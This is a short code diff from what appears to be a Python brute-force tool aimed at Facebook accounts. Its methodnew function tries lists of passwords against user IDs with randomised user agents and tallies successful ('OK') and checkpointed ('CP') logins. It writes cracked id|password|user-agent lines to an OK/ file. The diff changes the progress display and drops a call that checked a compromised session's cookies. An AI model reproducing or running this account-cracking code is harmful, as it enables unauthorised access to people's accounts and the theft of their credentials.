@@ -999,8 +999,8 @@ def methodnew(idf,pwv):
 	ua = random.choice(free) 
 	#ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	prog.update(des,description=f"{k}iphone.facebook{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
-	prog.advance(des) 
+	prog.update(des,description=f'\r[bold white]Validate [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{ok}[/] [yellow]CP:[yellow]{cp}')
+	prog.advance(des)
 	for pw in pwv:
 		try:
 			if 'ya' in uman: ua = usman1[0]
@@ -1048,7 +1048,6 @@ def methodnew(idf,pwv):
 				tree.add(f"[bold green]{ua}\n")
 				cetak(tree) 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
-				cek_apk(session,coki)
 				break
 				
 			else:
